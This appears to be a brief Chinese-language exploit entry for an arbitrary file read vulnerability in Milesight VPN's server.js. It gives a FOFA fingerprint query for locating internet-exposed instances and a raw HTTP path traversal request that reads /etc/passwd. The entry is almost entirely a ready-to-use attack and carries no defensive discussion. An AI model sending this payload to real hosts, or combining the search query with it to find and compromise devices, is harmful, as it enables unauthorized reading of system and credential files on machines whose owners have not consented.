# Milesight VPN server.js 任意文件读取漏洞

## 网络测绘

fofa: app="Milesight-VPN" || "MilesightVPN"

## POC / EXP

```
GET /../etc/passwd HTTP/1.1
Host: 
Accept: */*
Content-Type: application/x-www-form-urlencoded
```